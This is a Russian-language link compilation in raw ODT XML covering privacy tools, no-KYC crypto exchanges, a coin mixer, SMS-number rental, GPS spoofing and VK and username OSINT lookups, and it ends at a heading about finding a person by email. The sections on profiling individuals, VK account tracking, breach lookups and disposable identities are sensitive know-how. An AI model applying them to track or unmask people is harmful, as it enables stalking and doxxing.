      <text:p text:style-name="P2">1. https://list.jabber.at/</text:p>
      <text:p text:style-name="P21">2. https://www.jabberes.org/servers/</text:p>
      <text:p text:style-name="P21">3. https://www.xmpp.jp/</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">5. https://compliance.conversations.im/old/ (со сравнением по критериям) </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P6">8. https://xmpp.love/</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2">Подборка PHP Lite почтовых клиентов </text:p>
      <text:p text:style-name="P2">1. Cypht (https://cypht.org/index.html) - модульный почтовый клиент с кучей плагинов, легковесный, есть RSS новостная лента. </text:p>
      <text:p text:style-name="P2">2. Squirrelmail <text:s/>(https://www.squirrelmail.org/) - старенькая, но надежная легковесная почта с минималистичным дизайном и поддержкой PGP шифрования.</text:p>
      <text:p text:style-name="P2">3. Rainloop (https://www.rainloop.net/) - не хранит никакие данные на серверах, плагины, шифрование OpenPGP по умолчанию.</text:p>
      <text:p text:style-name="P2">4. Horde (https://www.horde.org/) - минималистичный, PHPшный почтовый клиент, схожий со Squirrelmail. </text:p>
      <text:p text:style-name="P2">5. Afterlogic WebMail Lite (https://afterlogic.org/webmail-lite) - клиент с поддержкой интеграции различных сервисов, OpenPGP шифрованием</text:p>
      <text:p text:style-name="P22"><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2">Подборка сервисов без KYC. Часть 1.</text:p>
      <text:p text:style-name="P12">1. Крипто-биржи/обменники:</text:p>
      <text:p text:style-name="P12">Bisq (https://bisq.network/)</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">exch (https://exch.cx/)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">3. </text:span><text:span text:style-name="T3">Хостинги</text:span><text:span text:style-name="T2"> &amp; VPS:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Njalla (https://njal.la/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">IncogNET (https://incognet.io/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Hostiko (https://hostiko.com.ua/en)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P4" loext:marker-style-name="T1"><text:span text:style-name="T2">CryptoHO.ST (https://cryptoho.st/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Полезные </text:span><text:span text:style-name="T2">Telegram</text:span><text:span text:style-name="T3"> боты</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">4. </text:span><text:span text:style-name="T2">TGStat</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Alert</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Bot</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">me</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">TGAlertsBot</text:span><text:span text:style-name="T3">) - уведомляет о новых публикациях по ключевым словам в </text:span><text:span text:style-name="T2">Telegram</text:span><text:span text:style-name="T3">-каналах и чатах.</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T3">5. </text:span><text:span text:style-name="T2">SaveTargetbot</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">me</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">SaveTargetbot</text:span><text:span text:style-name="T3">) - выгружает из </text:span><text:span text:style-name="T2">Instagram</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">TikTok</text:span><text:span text:style-name="T3"> или </text:span><text:span text:style-name="T2">Pinterest</text:span><text:span text:style-name="T3"> фото, видео, аудио и текст.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Подборка сервисов без </text:span><text:span text:style-name="T2">KYC</text:span><text:span text:style-name="T3">. Часть 2.</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">1. Крипто-биржи/обменники:</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">AgoraDesk (https://agoradesk.com/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Majestic Bank (https://majesticbank.su/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">2. Хостинги &amp; VPS:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">NiceVPS (https://nicevps.net/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">AnyCOLO (https://anycolo.net/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">FlokiNET (https://flokinet.is/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2">3. Аренда телефонных номеров и приём СМС:</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">JuicySMS (https://juicysms.com/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">AnonCards (https://anoncards.io/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Silent Link (https://silent.link/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">VirutalSIM (https://virtualsim.co/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P4" loext:marker-style-name="T1"><text:span text:style-name="T2">Crypton (https://crypton.sh/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T3">Подборка сервисов без </text:span><text:span text:style-name="T2">KYC</text:span><text:span text:style-name="T3">. Часть 3.</text:span></text:p>
      <text:p text:style-name="P2">1. Крипто-биржи/обменники:</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">WizardSwap (https://www.wizardswap.io/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">SideShift</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">sideshift</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">ai</text:span><text:span text:style-name="T3">/)</text:span></text:p>
      <text:p text:style-name="P2">2. Аренда телефонных номеров и приём СМС:</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">SMSPva</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T4">https</text:span><text:span text:style-name="T5">://</text:span><text:span text:style-name="T4">smspva</text:span><text:span text:style-name="T5">.</text:span><text:span text:style-name="T4">com</text:span><text:span text:style-name="T5">/</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">JMP</text:span><text:span text:style-name="T3"> (отправка </text:span><text:span text:style-name="T2">SMS</text:span><text:span text:style-name="T3"> через </text:span><text:span text:style-name="T2">XMPP</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">SMS</text:span><text:span text:style-name="T3">4</text:span><text:span text:style-name="T2">Sats</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">sms</text:span><text:span text:style-name="T3">4</text:span><text:span text:style-name="T2">sats</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/)</text:span></text:p>
      <text:p text:style-name="P2">3. Разные сервисы</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">ProxyStore</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">digitalgoods</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">proxysto</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">re</text:span><text:span text:style-name="T3">/) (магазин аккаунтов, прокси и т.д.)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Lend by HodlHodl (https://lend.hodlhodl.com/) (р2р лендинг)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P4" loext:marker-style-name="T1"><text:span text:style-name="T2">UniJoin (https://unijoin.io/)(миксер)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Подменяем данные геолокации на </text:span><text:span text:style-name="T2">Android</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">1. </text:span><text:span text:style-name="T2">Private</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Location</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packages</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">wesaphzt</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">privatelocation</text:span><text:span text:style-name="T3">/) - приложение для подмены данных вашей геолокации (спуфа).</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Простой в использовании. Использует </text:span><text:span text:style-name="T2">OpenStreetMap</text:span><text:span text:style-name="T3">. Поддерживается разработчиками, не так давно вышла версия 1.2.</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3">2. </text:span><text:span text:style-name="T2">Fake</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Traveler</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en</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">packages</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">cl</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">coders</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">faketraveler</text:span><text:span text:style-name="T3">/) - аналогичное приложение, не требует </text:span><text:span text:style-name="T2">root</text:span><text:span text:style-name="T3"> прав.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Повышаем приватность и быстродействие вашего </text:span><text:span text:style-name="T2">Android</text:span><text:span text:style-name="T3"> девайса:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">1. </text:span><text:span text:style-name="T2">Island</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com</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">oasisfeng</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">island</text:span><text:span text:style-name="T3">) - песочница, позволяющая клонировать выбранные приложения и запускать их в изоляции, предотвращая доступ к вашим личным данным или информации об устройстве. Ранее упоминал похожее, </text:span><text:span text:style-name="T2">Shelter</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">2. </text:span><text:span text:style-name="T2">SuperFreezZ</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en</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">packages</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">superfreeze</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">tool</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">android</text:span><text:span text:style-name="T3">/) - приложение, позволяющее заморозить все фоновые действия других приложений. Сильно увеличивает срок службы батареи вашего смартфона в сочетании с автономным режимом. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">3. </text:span><text:span text:style-name="T2">Bouncer</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com</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">samruston</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">permission</text:span><text:span text:style-name="T3">) - позволяет временно изменить ограничения для </text:span><text:soft-page-break/><text:span text:style-name="T3">конкретного приложения (например, на доступ к камере или геолокации), а потом снова их вернуть.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2">Подменяем данные геолокации на смартфоне:</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">iOS</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">1. Tenorshare iAnyGo (https://www.tenorshare.com/products/ianygo-change-gps-location-iphone.html)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">2. iSpoofer (https://kubadownload.com/news/ispoofer-ios-ipa/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">3. iTools (https://www.itools4.com/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Android</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">1. Fake GPS Location Go (https://play.google.com/store/apps/details?id=com.xdoapp.virtualphonenavigation)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">2. Fake GPS 360 (https://play.google.com/store/apps/details?id=com.pe.fakegps&amp;hl=en&amp;gl=US)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">3. FlyGPS (https://play.google.com/store/apps/details?id=com.fly.gps&amp;hl=en&amp;gl=US)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">4. Fake GPS Location Spoofer (https://play.google.com/store/apps/details?id=com.incorporateapps.fakegps.fre)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P4" loext:marker-style-name="T1"><text:span text:style-name="T2">5. Fake GPS Run (https://play.google.com/store/apps/details?id=com.pe.fakegpsrun)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Подборка PGP менеджеров:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">1. SeaHorse (https://wiki.gnome.org/Apps/Seahorse/) (Linux/GNOME)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">2. Kleopatra (https://apps.kde.org/kleopatra/) (Linux/KDE)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">3. GPG4Win (https://www.gpg4win.org/) (Windows) </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">4. GPG Suite (https://gpgtools.org/) (MacOS) </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">5. OpenKeyChain (https://www.openkeychain.org/) (Android) </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">6. PGP Everywhere (https://www.pgpeverywhere.com/) (iOS)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">7. FlowCrypt <text:s/>(https://flowcrypt.com/)(Браузер) </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">8. EnigMail (ThunderBird)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">9. p≡p (Android, iOS, Thunderbird, Enigmail)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P4" loext:marker-style-name="T1"><text:span text:style-name="T2">10. GPG4USB (https://gpg4usb.org/) (Portable)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2">Подборка сервисов сравнения текстов и установления авторства: </text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">1. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">text</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">compare</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">2. </text:span><text:span text:style-name="T2">http</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">diffchecker</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T3">3. </text:span><text:a xlink:type="simple" xlink:href="https://app.copyleaks.com/text-compare" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">app</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">copyleaks</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">text</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">compare</text:span></text:a></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T3">4. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">copyscape</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">compare</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">php</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">5. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">github</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">evllabs</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">JGAAP</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T3">6. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">countwordsfree</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">comparetexts</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Повышаем приватность вашего </text:span><text:span text:style-name="T2">Android</text:span><text:span text:style-name="T3"> девайса. Часть 3:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">1. </text:span><text:span text:style-name="T2">Daedalus</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org</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">itxtech</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">daedalus</text:span><text:span text:style-name="T3">) - модификатор </text:span><text:span text:style-name="T2">DNS</text:span><text:span text:style-name="T3"> и распознаватель </text:span><text:span text:style-name="T2">hosts</text:span><text:span text:style-name="T3">. Не тербует </text:span><text:span text:style-name="T2">DNSMasq</text:span><text:span text:style-name="T3">, работает путем создания </text:span><text:span text:style-name="T2">VPN</text:span><text:span text:style-name="T3">-туннеля с целью изменения настроек </text:span><text:span text:style-name="T2">DNS</text:span><text:span text:style-name="T3">. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">2. </text:span><text:span text:style-name="T2">ScreenWings</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">schiffer</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">tech</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">screenwings</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">mobile</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">html</text:span><text:span text:style-name="T3">) - запрещает фоновым процессам делать скриншоты вашего экрана. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">3. </text:span><text:span text:style-name="T2">Catch</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">the</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Man</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">in</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">the</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">Middle</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me</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">brax</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">certchecker</text:span><text:span text:style-name="T3">) - приложение, предупреждающее от </text:span><text:span text:style-name="T2">MiTM</text:span><text:span text:style-name="T3"> атак. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">4. </text:span><text:span text:style-name="T2">Rethink</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">DNS</text:span><text:span text:style-name="T3"> + </text:span><text:span text:style-name="T2">Firewall</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">github</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">celzero</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">rethink</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">app</text:span><text:span text:style-name="T3">) - </text:span><text:span text:style-name="T2">DNS</text:span><text:span text:style-name="T3"> клиент (</text:span><text:span text:style-name="T2">DoH</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">DNSCrypt</text:span><text:span text:style-name="T3">) + гибкий в настройке фаерволл. </text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3">5. </text:span><text:span text:style-name="T2">CamWings</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">schiffer</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">tech</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">camwings</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">mobile</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">html</text:span><text:span text:style-name="T3">) - предотвращает фоновое использование камеры другими приложениями и процессами.</text:span></text:p>
      <text:p text:style-name="P2">Пробиваем человека по юзернейму:</text:p>
      <text:p text:style-name="P2">1. https://www.google.com/search?q=""username</text:p>
      <text:p text:style-name="P2">2. https://www.bing.com/search?q=""username</text:p>
      <text:p text:style-name="P2">3. https://yandex.com/search/?text=%22%22&amp;lr=10519</text:p>
      <text:p text:style-name="P2">3. https://knowem.com/checkusernames.php?u=</text:p>
      <text:p text:style-name="P2">4. https://knowem.com/checksocialnames.php?u=</text:p>
      <text:p text:style-name="P2">5. https://usersearch.org/</text:p>
      <text:p text:style-name="P2">6. https://namevine.com/</text:p>
      <text:p text:style-name="P2">7. https://www.social-searcher.com</text:p>
      <text:p text:style-name="P2">8. https://en.gravatar.com/</text:p>
      <text:p text:style-name="P2">9. https://dehashed.com/</text:p>
      <text:p text:style-name="P2">10. https://haveibeenpwned.com</text:p>
      <text:p text:style-name="P2">11. https://linktr.ee/</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">12. https://www.searchmy.bio/</text:span></text:p>
      <text:p text:style-name="P6">13. https://namechk.com/</text:p>
      <text:p text:style-name="P2">Анализируем страницу ВКонтакте:</text:p>
      <text:p text:style-name="P2">1. https://regvk.com/id/ - узнаем ID страницы;</text:p>
      <text:p text:style-name="P2">2. https://vk.com/app7183114 - позволяет узнать информацию о группе;</text:p>
      <text:p text:style-name="P2">3. http://ininterests.com/ - архив страниц ВК, где можно найти информацию об удаленных страницах;</text:p>
      <text:p text:style-name="P12">4. https://220vk.com/ - комплексный инструмент для работы с ВК, упомянутый мной ранее;</text:p>
      <text:p text:style-name="P12">5. https://vk.watch/ID/profile - еще один сайт с архивами профилей;</text:p>
      <text:p text:style-name="P2">6. https://archive.org/ - стандартный интернет-архив, тоже может быть полезен;</text:p>
      <text:p text:style-name="P2">7. https://vk.city4me.com/ - слежка за аккаунтом ВК;</text:p>
      <text:p text:style-name="P2">8. https://vk.watch/ - комплексный OSINT инструмент;</text:p>
      <text:p text:style-name="P2">9. https://t.me/InfoVkUser_bot - проводит анализ друзей профиля;</text:p>
      <text:p text:style-name="P6">10. https://github.com/Postuf/vkontakte-osint-lib - библиотека OSINT сценариев.</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Упрощаем жизнь скриптами для пользователей *nix систем:</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2">4.openvpn-install (https://github.com/angristan/openvpn-install) - скрипт, позволяющий установить клиент OpenVPN в максимально короткий срок.</text:p>
      <text:p text:style-name="P6">5.Privacy.Sexy - инструмент с открытым исходным кодом для генерации скриптов, нужных для соблюдения лучших практик конфиденциальности и безопасности, а также отключения всевозможной телеметрии.</text:p>
      <text:p text:style-name="P2">Используем блага нейросетей:</text:p>
      <text:p text:style-name="P2">1. https://www.copy.ai/ - инструмент копирайтинга на основе нейронных сетей;</text:p>
      <text:p text:style-name="P2">2. https://mubert.com/ - генерация музыки из текста с помощью ИИ, нейронных сетей, есть бесплатный тариф;</text:p>
      <text:p text:style-name="P2">3. https://app.baseten.co/apps/QPp4nPE/operator_views/RqgOnqV - GPG-FAN, нейросеть для реставрации старых фото;</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">4. https://uberduck.ai/ - генерация голоса из текста с помощью ИИ, платный, но есть и триал;</text:span></text:p>
      <text:p text:style-name="P2">5. https://openai.com/ и https://chat.openai.com/chat - не нуждаются в представлении, используем VPN или socks для доступа + любую СМС активацию с не ру номерами;</text:p>
      <text:p text:style-name="P2">6. https://lumen5.com/ - ИИ для создания видео;</text:p>
      <text:p text:style-name="P2">7. https://huggingface.co/ - репозиторий ИИ проектов, много можно найти демок и бесплатных версий;</text:p>
      <text:p text:style-name="P2">8. https://designs.ai/ru - онлайн редактор видео на основе ИИ, есть бесплатный триал на 30 дней;</text:p>
      <text:p text:style-name="P2">9. https://midjourney.com - арт-нейросеть, не нуждающаяся в представлении;</text:p>
      <text:p text:style-name="P2">10. https://looka.com/ - сервис для генерации логотипов и медиа китов на базе ИИ;</text:p>
      <text:p text:style-name="P2">11. https://bigjpg.com/ - бесплатный сервис для увеличения фото и иллюстраций без потери качества;</text:p>
      <text:p text:style-name="P2">12. https://artbreeder.com/ - генерация картинок нейронками, есть бесплатный тариф;</text:p>
      <text:p text:style-name="P2">13. https://neural.love/ - улучшение фото и видео с помощью нейросетей, настоящий ИИ комбайн, есть бесплатные функции;</text:p>
      <text:p text:style-name="P2">14. https://openai.com/dall-e-2/ - еще одна популярная арт-нейросеть;</text:p>
      <text:p text:style-name="P24">15. https://www.notion.so/product/ai - новый ИИ для копирайтинга и создания контента, можно записаться в лист ожидания.</text:p>
      <text:p text:style-name="P2">VPN клиенты с открытым исходным кодом:</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">1. SoftEther VPN (https://www.softether.org/5-download)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">2. OpenVPN (https://openvpn.net/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">3. StrongSwan (https://www.strongswan.org/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">4. OpenSwan VPN (https://openswan.org/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">5. Freelan (https://www.freelan.org/download.html#)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">6. Libreswan (https://libreswan.org/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">7. WireGuard (https://www.wireguard.com/install/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P4" loext:marker-style-name="T1"><text:span text:style-name="T2">8. ZeroTier (https://www.zerotier.com/download/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">#</text:span><text:span text:style-name="T2">Termux</text:span></text:p>
      <text:p text:style-name="P2">Получаем информацию о человеке, зная его почту:</text:p>
